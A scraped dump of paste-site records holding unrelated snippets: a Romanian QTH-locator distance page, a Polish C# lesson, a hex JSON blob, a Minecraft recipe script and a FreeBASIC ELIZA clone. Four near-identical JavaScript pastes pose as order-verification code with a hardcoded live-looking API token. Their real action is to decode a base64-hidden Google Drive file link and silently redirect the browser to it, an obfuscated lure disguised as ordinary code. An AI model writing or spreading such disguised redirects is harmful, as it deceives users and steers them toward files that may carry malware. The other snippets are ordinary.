                      Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) *
                      Math.sin(dLon / 2) * Math.sin(dLon / 2);
            const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
            return R * c; // Distanța în kilometri
        }

        // Funcție principală pentru calcul
        function calculateDistance() {
            const qth1 = document.getElementById(""qth1"").value.trim();
            const qth2 = document.getElementById(""qth2"").value.trim();
            const resultElement = document.getElementById(""result"");

            if (qth1.length < 6 || qth2.length < 6) {
                resultElement.textContent = ""Te rog introdu locatoare QTH valide (ex. JN48QM)."";
                return;
            }

            const coord1 = qthToLatLon(qth1);
            const coord2 = qthToLatLon(qth2);

            if (!coord1 || !coord2) {
                resultElement.textContent = ""Locatoare QTH invalide."";
                return;
            }

            const distance = haversineDistance(coord1.lat, coord1.lon, coord2.lat, coord2.lon);
            resultElement.textContent = `Distanța între ${qth1} și ${qth2} este de ${distance.toFixed(2)} km.`;
        }
    </script>
</body>
</html>
"
WQ93kAm2,Market.js,navrajkhunger,JavaScript,Saturday 29th of March 2025 07:15:46 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/277/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
xV1f4jj3,Untitled,navrajkhunger,JavaScript,Saturday 29th of March 2025 07:00:23 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/590/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
HBnyKVA4,debug,Cassimus,C#,Saturday 29th of March 2025 07:00:18 AM CDT,"public class Lekcja8
{
    public static void Main(string[] args)
    {
        System.Console.WriteLine(""Cześć! Jak masz na imię?"");
        string? imie = Console.ReadLine();

        if (imie == null) return;

        System.Console.WriteLine($""Witaj {imie.ToUpper()}. Co Chcesz robić?: "");
        System.Console.WriteLine(""a. dodawanie \nb. odejmowanie \nc. mnożenie \nd. dzielenie"");

        string? wybor = Console.ReadLine();
        if (wybor == null) return;

        Console.Write(""Podaj pierwszą liczbę: "");
        int liczba1;

        try
        {
            liczba1 = int.Parse(Console.ReadLine()!);
        }
        catch (FormatException format)
        {
            System.Console.WriteLine(""Podana wartość nie jest liczbą"");
            System.Console.WriteLine(format.Message);
            return;
        }
        catch (Exception)
        {
            System.Console.WriteLine(""Coś poszlo nie tak"");
            return;
        }

        int liczba2;
        bool parsowanie = int.TryParse(Console.ReadLine(), out liczba2);

        if (!parsowanie)
        {
            System.Console.WriteLine(""To nie jest liczba"");
            return;
        }

        System.Console.WriteLine($""Podałeś liczbę: {liczba1}"");

    }
}

"
n6werbVV,dataNone,TestGuy1,JSON,Saturday 29th of March 2025 07:00:08 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '901994cf17ff280b14d0c971a40c830a2e8fc6bd8fd4d4d902f753cc3af87f814b473c097bf6ad3776b307dd41625a2045b4f073baa73a986decb9039468b8b89958aee958bd358971244ecc45d36de570233841c11f4fca41ac82a5dc32a0ea7df903df2838bdc0fa91226d7c4b55b338912864bf86680237767ccad4560026',
  otherdata: [
    '3c960dfd7c0b63ea89f0938facfb3c92',
    'f10e3c2851b74f55de7558b7401165e6',
    'f4fe021e3c52e5e8513574169b3884fd',
    'f9a2aa27fd8b08cc70087e2c94d65517',
    '34d74f3806bb371cdf61c430bf057958',
    '9394754da3c56bbc9d035f9a9ce2d3c2',
    '349770ba2c96a21bfe774244b84b99df',
    '8930215732f67c8bcd54d5400eb1d8ff'
  ]
}"
9cV5w9Tp,Script JS pour remplacer le craft des coffres sans devoir tous les faires un par un,Alexisdepris,JavaScript,Saturday 29th of March 2025 06:54:30 AM CDT,"ServerEvents.recipes(e => {
    let woodToChestMap = {
        // Ecologics
        'ecologics:coconut_planks': 'everycomp:q/ecologics/coconut_chest',
        'ecologics:azalea_planks': 'everycomp:q/ecologics/azalea_chest',
        'ecologics:walnut_planks': 'everycomp:q/ecologics/walnut_chest',
        // Nature's Spirit
        'natures_spirit:cedar_planks': 'everycomp:q/natures_spirit/cedar_chest',
        'natures_spirit:larch_planks': 'everycomp:q/natures_spirit/larch_chest',
        'natures_spirit:mahogany_planks': 'everycomp:q/natures_spirit/mahogany_chest',
        'natures_spirit:saxaul_planks': 'everycomp:q/natures_spirit/saxaul_chest',
        'natures_spirit:redwood_planks': 'everycomp:q/natures_spirit/redwood_chest',
        'natures_spirit:sugi_planks': 'everycomp:q/natures_spirit/sugi_chest',
        'natures_spirit:wisteria_planks': 'everycomp:q/natures_spirit/wisteria_chest',
        'natures_spirit:fir_planks': 'everycomp:q/natures_spirit/fir_chest',
        'natures_spirit:coconut_planks': 'everycomp:q/natures_spirit/coconut_chest',
        'natures_spirit:willow_planks': 'everycomp:q/natures_spirit/willow_chest',
        'natures_spirit:aspen_planks': 'everycomp:q/natures_spirit/aspen_chest',
        'natures_spirit:maple_planks': 'everycomp:q/natures_spirit/maple_chest',
        'natures_spirit:cypress_planks': 'everycomp:q/natures_spirit/cypress_chest',
        'natures_spirit:olive_planks': 'everycomp:q/natures_spirit/olive_chest',
        'natures_spirit:joshua_planks': 'everycomp:q/natures_spirit/joshua_chest',
        'natures_spirit:ghaf_planks': 'everycomp:q/natures_spirit/ghaf_chest',
        'natures_spirit:palo_verde_planks': 'everycomp:q/natures_spirit/palo_verde_chest',
        // Wevegone
        'biomeswevegone:aspen_planks': 'everycomp:q/biomeswevegone/aspen_chest',
        'biomeswevegone:baobab_planks': 'everycomp:q/biomeswevegone/baobab_chest',
        'biomeswevegone:blue_enchanted_planks': 'everycomp:q/biomeswevegone/blue_enchanted_chest',
        'biomeswevegone:cika_planks': 'everycomp:q/biomeswevegone/cika_chest',
        'biomeswevegone:cypress_planks': 'everycomp:q/biomeswevegone/cypress_chest',
        'biomeswevegone:ebony_planks': 'everycomp:q/biomeswevegone/ebony_chest',
        'biomeswevegone:fir_planks': 'everycomp:q/biomeswevegone/fir_chest',
        'biomeswevegone:green_enchanted_planks': 'everycomp:q/biomeswevegone/green_enchanted_chest',
        'biomeswevegone:holly_planks': 'everycomp:q/biomeswevegone/holly_chest',
        'biomeswevegone:skyris_planks': 'everycomp:q/biomeswevegone/skyris_chest',
        'biomeswevegone:white_mangrove_planks': 'everycomp:q/biomeswevegone/white_mangrove_chest',
        'biomeswevegone:willow_planks': 'everycomp:q/biomeswevegone/willow_chest',
        'biomeswevegone:witch_hazel_planks': 'everycomp:q/biomeswevegone/witch_hazel_chest',
        'biomeswevegone:zelkova_planks': 'everycomp:q/biomeswevegone/zelkova_chest',
        'biomeswevegone:ironwood_planks': 'everycomp:q/biomeswevegone/ironwood_chest',
        'biomeswevegone:jacaranda_planks': 'everycomp:q/biomeswevegone/jacaranda_chest',
        'biomeswevegone:mahogany_planks': 'everycomp:q/biomeswevegone/mahogany_chest',
        'biomeswevegone:maple_planks': 'everycomp:q/biomeswevegone/maple_chest',
        'biomeswevegone:palm_planks': 'everycomp:q/biomeswevegone/palm_chest',
        'biomeswevegone:pine_planks': 'everycomp:q/biomeswevegone/pine_chest',
        'biomeswevegone:rainbow_eucalyptus_planks': 'everycomp:q/biomeswevegone/rainbow_eucalyptus_chest',
        'biomeswevegone:redwood_planks': 'everycomp:q/biomeswevegone/redwood_chest',
        'biomeswevegone:sakura_planks': 'everycomp:q/biomeswevegone/sakura_chest',
        // Quark
        'quark:ancient_planks': 'quark:ancient_chest',
        'quark:azalea_planks': 'quark:azalea_chest',
        'quark:blossom_planks': 'quark:blossom_chest',
        'minecraft:oak_planks': 'quark:oak_chest',
        'minecraft:spruce_planks': 'quark:spruce_chest',
        'minecraft:birch_planks': 'quark:birch_chest',
        'minecraft:jungle_planks': 'quark:jungle_chest',
        'minecraft:acacia_planks': 'quark:acacia_chest',
        'minecraft:dark_oak_planks': 'quark:dark_oak_chest',
        'minecraft:prismarine': 'quark:prismarine_chest',
        'minecraft:purpur_block': 'quark:purpur_chest',
        'minecraft:nether_bricks': 'quark:nether_brick_chest',
        'minecraft:cherry_planks': 'quark:cherry_chest',
        'minecraft:bamboo_block': 'quark:bamboo_chest',
        'minecraft:mangrove_planks': 'quark:mangrove_chest',
        'minecraft:warped_planks': 'quark:warped_chest',
        'minecraft:crimson_planks': 'quark:crimson_chest'
    };

    for (let plank in woodToChestMap) {
        let chest = woodToChestMap[plank];
        
        // Suppression des recettes existantes pour éviter les conflits
        e.remove({ output: chest });
        
        // Ajout de la nouvelle recette avec une pépite de fer au centre
        e.shaped(Item.of(chest), [
            'PPP',
            'PIP',
            'PPP'
        ], {
            P: plank,
            I: 'minecraft:iron_nugget'
        });
    }
});
"
cx8wi3vj,Products.js,navrajkhunger,JavaScript,Saturday 29th of March 2025 06:45:00 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/641/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
HZVsrZS1,Order.js,navrajkhunger,JavaScript,Saturday 29th of March 2025 06:29:08 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/130/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
tEHcgDQu,Untitled,ronblue,FreeBasic,Saturday 29th of March 2025 06:15:44 AM CDT,"' ELIZA in FreeBASIC with DOS-style Interface
' A nostalgic implementation of the classic ELIZA program
' Based on the original concept by Joseph Weizenbaum

#include ""fbgfx.bi""  ' Include graphics library

' Define variable types
Type KeywordPattern
    keyword As String
    rank As Integer
    responses(9) As String
    responseCount As Integer
End Type

Type Transformation
    pattern As String
    replacement As String
End Type

' Main program
Dim Shared patterns(20) As KeywordPattern
Dim Shared transforms(30) As Transformation
Dim Shared patternCount As Integer
Dim Shared transformCount As Integer
Dim Shared conversationHistory(100) As String
Dim Shared historyCount As Integer = 0

' Colors for DOS-style interface - using constants to avoid COLOR reserved word
Const C_FRAME = 9        ' Light blue
Const C_TITLE = 14       ' Yellow
Const C_TEXT = 7         ' Light gray
Const C_USER = 15        ' Bright white
Const C_ELIZA = 11       ' Cyan
Const C_STATUS = 10      ' Light green
Const C_BACKGROUND = 1   ' Blue

' Initialize patterns and transformations
Sub InitializePatterns()
    ' Keywords with their responses
    ' Pattern 1: ""i need""
    patternCount = patternCount + 1
    patterns(patternCount).keyword = ""i need""
    patterns(patternCount).rank = 5
    patterns(patternCount).responses(0) = ""Why do you need %s?""
    patterns(patternCount).responses(1) = ""Would it really help you to get %s?""
    patterns(patternCount).responses(2) = ""Are you sure you need %s?""
    patterns(patternCount).responseCount = 3
    
    ' Pattern 2: ""sorry""
    patternCount = patternCount + 1
    patterns(patternCount).keyword = ""sorry""
    patterns(patternCount).rank = 4
    patterns(patternCount).responses(0) = ""There's no need to apologize.""
    patterns(patternCount).responses(1) = ""What feelings do you have when you apologize?""
    patterns(patternCount).responses(2) = ""I've told you that apologies are not necessary.""
    patterns(patternCount).responseCount = 3
    
    ' Pattern 3: ""i am"" or ""im""
    patternCount = patternCount + 1
    patterns(patternCount).keyword = ""i am""
    patterns(patternCount).rank = 5
    patterns(patternCount).responses(0) = ""Did you come to me because you are %s?""
    patterns(patternCount).responses(1) = ""How long have you been %s?""
    patterns(patternCount).responses(2) = ""How do you feel about being %s?""
    patterns(patternCount).responses(3) = ""Do you believe it is normal to be %s?""
    patterns(patternCount).responses(4) = ""Do you enjoy being %s?""
    patterns(patternCount).responseCount = 5

    patternCount = patternCount + 1
    patterns(patternCount).keyword = ""im""
    patterns(patternCount).rank = 5
    patterns(patternCount).responses(0) = ""Did you come to me because you're %s?""
    patterns(patternCount).responses(1) = ""How long have you been %s?""
    patterns(patternCount).responses(2) = ""How do you feel about being %s?""
    patterns(patternCount).responses(3) = ""Do you believe it is normal to be %s?""
    patterns(patternCount).responses(4) = ""Do you enjoy being %s?""
    patterns(patternCount).responseCount = 5
    
    ' Pattern 4: ""i believe""
    patternCount = patternCount + 1
    patterns(patternCount).keyword = ""i believe""
    patterns(patternCount).rank = 4
    patterns(patternCount).responses(0) = ""Do you really believe %s?""
    patterns(patternCount).responses(1) = ""But you're not sure you %s?""
    patterns(patternCount).responses(2) = ""Do you really doubt you %s?""
    patterns(patternCount).responseCount = 3
    
    ' Pattern 5: ""i feel""
    patternCount = patternCount + 1
    patterns(patternCount).keyword = ""i feel""
    patterns(patternCount).rank = 5
    patterns(patternCount).responses(0) = ""Tell me more about such feelings.""
    patterns(patternCount).responses(1) = ""Do you often feel %s?""
    patterns(patternCount).responses(2) = ""Do you enjoy feeling %s?""
    patterns(patternCount).responses(3) = ""What does feeling %s remind you of?""
    patterns(patternCount).responseCount = 4
    
    ' Pattern 6: ""i cant""
    patternCount = patternCount + 1
    patterns(patternCount).keyword = ""i cant""
    patterns(patternCount).rank = 4
    patterns(patternCount).responses(0) = ""How do you know you can't %s?""
    patterns(patternCount).responses(1) = ""Have you tried?""
    patterns(patternCount).responses(2) = ""Perhaps you could %s now.""
    patterns(patternCount).responses(3) = ""Do you really want to be able to %s?""
    patterns(patternCount).responseCount = 4
    
    ' Pattern 7: ""i want""
    patternCount = patternCount + 1
    patterns(patternCount).keyword = ""i want""
    patterns(patternCount).rank = 5
    patterns(patternCount).responses(0) = ""What would it mean to you if you got %s?""
    patterns(patternCount).responses(1) = ""Why do you want %s?""
    patterns(patternCount).responses(2) = ""What would you do if you got %s?""
    patterns(patternCount).responses(3) = ""If you got %s, then what would you do?""
    patterns(patternCount).responseCount = 4
    
    ' Pattern 8: ""what""
    patternCount = patternCount + 1
    patterns(patternCount).keyword = ""what""
    patterns(patternCount).rank = 3
    patterns(patternCount).responses(0) = ""Why do you ask?""
    patterns(patternCount).responses(1) = ""Does that question interest you?""
    patterns(patternCount).responses(2) = ""What is it you really want to know?""
    patterns(patternCount).responses(3) = ""Are such questions much on your mind?""
    patterns(patternCount).responses(4) = ""What do you think?""
    patterns(patternCount).responses(5) = ""What comes to mind when you ask that?""
    patterns(patternCount).responseCount = 6
    
    ' Pattern 9: ""how""
    patternCount = patternCount + 1
    patterns(patternCount).keyword = ""how""
    patterns(patternCount).rank = 3
    patterns(patternCount).responses(0) = ""How do you suppose?""
    patterns(patternCount).responses(1) = ""Perhaps you can answer your own question.""
    patterns(patternCount).responses(2) = ""What is it you're really asking?""
    patterns(patternCount).responseCount = 3
    
    ' Pattern 10: ""who""
    patternCount = patternCount + 1
    patterns(patternCount).keyword = ""who""
    patterns(patternCount).rank = 3
    patterns(patternCount).responses(0) = ""Why do you ask about %s?""
    patterns(patternCount).responses(1) = ""Would it matter to you?""
    patterns(patternCount).responses(2) = ""What do you think?""
    patterns(patternCount).responseCount = 3
    
    ' Pattern 11: generic responses for no match
    patternCount = patternCount + 1
    patterns(patternCount).keyword = """"
    patterns(patternCount).rank = 1
    patterns(patternCount).responses(0) = ""Very interesting.""
    patterns(patternCount).responses(1) = ""I see.""
    patterns(patternCount).responses(2) = ""I'm not sure I understand you fully.""
    patterns(patternCount).responses(3) = ""Can you elaborate on that?""
    patterns(patternCount).responses(4) = ""That is quite interesting.""
    patterns(patternCount).responses(5) = ""Please tell me more.""
    patterns(patternCount).responses(6) = ""Let's change focus a bit... Tell me about your family.""
    patterns(patternCount).responses(7) = ""Can you elaborate on that?""
    patterns(patternCount).responses(8) = ""Why do you say that?""
    patterns(patternCount).responses(9) = ""I see. And what does that suggest to you?""
    patterns(patternCount).responseCount = 10
    
    ' Set up transformations from first person to second person, etc.
    transformCount = 0
    
    transformCount = transformCount + 1
    transforms(transformCount).pattern = "" i ""
    transforms(transformCount).replacement = "" you ""
    
    transformCount = transformCount + 1
    transforms(transformCount).pattern = "" im ""
    transforms(transformCount).replacement = "" you're ""
    
    transformCount = transformCount + 1
    transforms(transformCount).pattern = "" i am ""
    transforms(transformCount).replacement = "" you are ""
    
    transformCount = transformCount + 1
    transforms(transformCount).pattern = "" my ""
    transforms(transformCount).replacement = "" your ""
    
    transformCount = transformCount + 1
    transforms(transformCount).pattern = "" me ""
    transforms(transformCount).replacement = "" you ""
    
    transformCount = transformCount + 1
    transforms(transformCount).pattern = "" mine ""
    transforms(transformCount).replacement = "" yours ""
    
    transformCount = transformCount + 1
    transforms(transformCount).pattern = "" you ""
    transforms(transformCount).replacement = "" I ""
    
    transformCount = transformCount + 1
    transforms(transformCount).pattern = "" your ""
    transforms(transformCount).replacement = "" my ""
    
    transformCount = transformCount + 1
    transforms(transformCount).pattern = "" yours ""
    transforms(transformCount).replacement = "" mine ""
    
    transformCount = transformCount + 1
    transforms(transformCount).pattern = "" you are ""
    transforms(transformCount).replacement = "" I am ""
    
    transformCount = transformCount + 1
    transforms(transformCount).pattern = "" you're ""
    transforms(transformCount).replacement = "" I'm ""
End Sub

' Transform user input for response
Function TransformInput(userInputText As String) As String
    Dim As String resultText = LCase(userInputText)
    
    ' Apply transformations
    For i As Integer = 1 To transformCount
        Dim As String patternText = transforms(i).pattern
        Dim As String replacementText = transforms(i).replacement
        
        ' Simple replace - in a more advanced version, use regular expressions
        Dim As Integer positionVal = InStr(resultText, patternText)
        While positionVal > 0
            resultText = Left(resultText, positionVal - 1) + replacementText + Mid(resultText, positionVal + Len(patternText))
            positionVal = InStr(positionVal + Len(replacementText), resultText, patternText)
        Wend
    Next
    
    Return resultText
End Function

' Find the best matching pattern
Function FindPattern(userInputText As String) As Integer
    Dim As Integer bestMatch = patternCount ' Default to generic responses
    Dim As Integer bestRank = 0
    
    ' Convert input to lowercase for case-insensitive matching
    Dim As String inputText = LCase(userInputText)
    
    ' Look for each pattern in the input
    For i As Integer = 1 To patternCount
        Dim As String keyword = patterns(i).keyword
        Dim As Integer positionVal = InStr(inputText, keyword)
        
        If positionVal > 0 And patterns(i).rank > bestRank Then
            bestMatch = i
            bestRank = patterns(i).rank
        End If
    Next
    
    Return bestMatch
End Function

' Get remainder of input after keyword
Function GetRemainder(userInputText As String, keywordIndex As Integer) As String
    Dim As String inputText = LCase(userInputText)
    Dim As String keyword = patterns(keywordIndex).keyword
    Dim As Integer positionVal = InStr(inputText, keyword)
    
    If positionVal > 0 And Len(keyword) > 0 Then
        Return Mid(inputText, positionVal + Len(keyword))
    Else
        Return """"
    End If
End Function

' Draw a single-line box
Sub DrawBox(x1 As Integer, y1 As Integer, x2 As Integer, y2 As Integer, boxColor As Integer)
    Color boxColor
    ' Top and bottom lines
    Line (x1, y1)-(x2, y1)
    Line (x1, y2)-(x2, y2)
    ' Left and right lines
    Line (x1, y1)-(x1, y2)
    Line (x2, y1)-(x2, y2)
End Sub

' Draw a double-line box
Sub DrawDoubleBox(x1 As Integer, y1 As Integer, x2 As Integer, y2 As Integer, boxColor As Integer)
    Color boxColor
    ' Outer box
    DrawBox(x1, y1, x2, y2, boxColor)
    ' Inner box
    DrawBox(x1 + 1, y1 + 1, x2 - 1, y2 - 1, boxColor)
End Sub

' Draw title bar
Sub DrawTitleBar(titleText As String)
    Color C_TITLE, C_FRAME
    ' Draw title background
    Line (1, 1)-(80, 3), C_FRAME, BF
    ' Print centered title
    Locate 2, 40 - Len(titleText) \ 2
    Print titleText;
End Sub

' Draw status bar
Sub DrawStatusBar(statusText As String)
    Color C_STATUS, C_FRAME
    ' Draw status background
    Line (1, 25)-(80, 25), C_FRAME, BF
    ' Print left-aligned status
    Locate 25, 2
    Print statusText;
    ' Print right-aligned help
    Locate 25, 60
    Print ""Press ESC to exit"";
End Sub

' Draw intro animation
Sub DrawIntro()
    Dim As String titleText = "" ELIZA - Electronic Psychotherapist ""
    Dim As Integer i, j, center_x = 40, center_y = 12
    
    ' Clear screen 
    Screen 0
    Width 80, 25
    Color C_TEXT, C_BACKGROUND
    Cls
    
    ' Draw expanding circles animation
    For i = 1 To 15
        Circle (center_x, center_y), i, (i Mod 7) + 9
        Sleep 50
    Next i
    
    ' Animate title appear
    For i = 1 To Len(titleText)
        Locate center_y, center_x - Len(titleText) \ 2 + i
        Color ((i Mod 7) + 9)
        Print Mid(titleText, i, 1);
        Sleep 50
    Next i
    
    ' Flash the title
    For i = 1 To 3
        For j = 9 To 15
            Locate center_y, center_x - Len(titleText) \ 2
            Color j
            Print titleText;
            Sleep 50
        Next j
    Next i
    
    ' Wait a moment
    Sleep 500
    
    ' Clear the screen again for main interface
    Color C_TEXT, C_BACKGROUND
    Cls
End Sub

' Draw main interface
Sub DrawInterface()
    ' Clear screen with background color
    Color C_TEXT, C_BACKGROUND
    Cls
    
    ' Draw outer frame
    DrawDoubleBox(1, 1, 80, 25, C_FRAME)
    
    ' Draw title bar
    DrawTitleBar(""ELIZA - Psychological Computer Therapist v2.1"")
    
    ' Draw conversation area frame
    DrawBox(2, 4, 79, 20, C_FRAME)
    
    ' Draw input area frame
    DrawBox(2, 21, 79, 24, C_FRAME)
    
    ' Draw status bar
    DrawStatusBar(""Ready for conversation"")
    
    ' Initial prompt
    Locate 5, 4
    Color C_ELIZA
    Print ""ELIZA: Hello, I am ELIZA. How are you feeling today?"";
    
    ' Set input prompt
    Locate 22, 4
    Color C_USER
    Print ""YOU: "";
End Sub

' Update conversation area with history
Sub UpdateConversation()
    ' Clear conversation area
    Color C_TEXT, C_BACKGROUND
    For i As Integer = 5 To 19
        Locate i, 4
        Print Space(75);
    Next i
    
    ' Display history (up to the most recent 14 lines)
    Dim As Integer startLine = 0
    If historyCount > 14 Then
        startLine = historyCount - 14
    End If
    
    For i As Integer = startLine To historyCount - 1
        Dim As Integer lineNum = 5 + (i - startLine)
        If Left(conversationHistory(i), 6) = ""ELIZA:"" Then
            Locate lineNum, 4
            Color C_ELIZA
        Else
            Locate lineNum, 4
            Color C_USER
        End If
        ' Wrap text if needed
        Dim As String textLine = conversationHistory(i)
        If Len(textLine) > 75 Then
            Print Left(textLine, 75);
            ' If line is too long, continue on next line
            If lineNum + 1 <= 19 Then
                Locate lineNum + 1, 4
                Print ""    "" + Mid(textLine, 76);
            End If
        Else
            Print textLine;
        End If
    Next i
End Sub

' Add text to conversation history
Sub AddToHistory(speaker As String, textMsg As String)
    conversationHistory(historyCount) = speaker + "": "" + textMsg
    historyCount = historyCount + 1
    UpdateConversation()
End Sub

' Display typing animation for ELIZA's responses
Sub DisplayTypingAnimation(responseText As String)
    Dim As Integer cursorY = 0
    
    ' Find the next available line position
    For i As Integer = 19 To 5 Step -1
        Locate i, 4
        Dim As String currentText = """"
        Dim As Integer visibleText = Pos(i) ' Get cursor position to check if line is empty
        If visibleText = 4 Then  ' If cursor is at starting position, line is empty
            cursorY = i
            Exit For
        End If
    Next i
    
    If cursorY = 0 Then cursorY = 19 ' Default to last line if all full
    
    ' Show ""ELIZA is typing..."" animation
    Locate cursorY, 4
    Color C_ELIZA
    Print ""ELIZA: "";
    
    For i As Integer = 1 To 3
        Print ""."";
        Sleep 300
        Locate cursorY, 10 + i
    Next i
    
    ' Clear the ""typing"" text
    Locate cursorY, 4
    Print Space(15);
    
    ' Type out the response character by character
    Locate cursorY, 4
    Color C_ELIZA
    Print ""ELIZA: "";
    
    For i As Integer = 1 To Len(responseText)
        Print Mid(responseText, i, 1);
        ' Randomize typing speed slightly
        Sleep 30 + (Rnd * 30)
    Next i
End Sub

' Main program
Sub Main()
    Dim As String userInputText, responseText
    Dim As Integer patternIndex, responseIndex
    Dim As String remainder
    Dim As String k
    
    ' Initialize patterns and transformations
    patternCount = 0
    transformCount = 0
    InitializePatterns()
    
    ' Display intro animation
    DrawIntro()
    
    ' Setup main interface
    DrawInterface()
    
    ' Add initial greeting to history
    AddToHistory(""ELIZA"", ""Hello, I am ELIZA. How are you feeling today?"")
    
    ' Main conversation loop
    Do
        ' Get user input
        Locate 22, 9
        Color C_USER
        Line Input """", userInputText
        
        ' Clear input line
        Locate 22, 9
        Print Space(70);
        
        ' Add user input to history
        If Len(userInputText) > 0 Then
            AddToHistory(""YOU"", userInputText)
        End If
        
        ' Exit if user types ""bye""
        If LCase(userInputText) = ""bye"" Then
            DisplayTypingAnimation(""Goodbye. I hope our conversation was helpful."")
            AddToHistory(""ELIZA"", ""Goodbye. I hope our conversation was helpful."")
            
            ' Wait for key press before exiting
            Locate 22, 4
            Color C_STATUS
            Print ""Press any key to exit..."";
            Sleep 500
            Do
                k = Inkey()
            Loop Until Len(k) > 0
            Exit Do
        End If
        
        ' Skip processing if empty input
        If Len(userInputText) = 0 Then
            DisplayTypingAnimation(""I didn't quite catch that. Can you say something?"")
            AddToHistory(""ELIZA"", ""I didn't quite catch that. Can you say something?"")
        Else
            ' Find the best matching pattern
            patternIndex = FindPattern(userInputText)
            
            ' Get a random response for this pattern
            responseIndex = Int(Rnd * patterns(patternIndex).responseCount)
            responseText = patterns(patternIndex).responses(responseIndex)
            
            ' If the response contains a placeholder, replace it with transformed input
            If InStr(responseText, ""%s"") > 0 Then
                remainder = GetRemainder(userInputText, patternIndex)
                remainder = TransformInput(remainder)
                
                ' Custom replacement for ""%s"" with remainder
                Dim As Integer placeholderPos = InStr(responseText, ""%s"")
                If placeholderPos > 0 Then
                    responseText = Left(responseText, placeholderPos - 1) + remainder + _
                                  Mid(responseText, placeholderPos + 2)
                End If
            End If
            
            ' Show typing animation and add to history
            DisplayTypingAnimation(responseText)
            AddToHistory(""ELIZA"", responseText)
        End If
        
        ' Check for escape key to exit
        k = Inkey()
        If k = Chr(27) Then ' ESC key
            Exit Do
        End If
    Loop
    
    ' Clean up
    Screen 0
    Width 80, 25
    Color 7, 0
    Cls
End Sub

' Start the program
Randomize Timer
Main()
End"
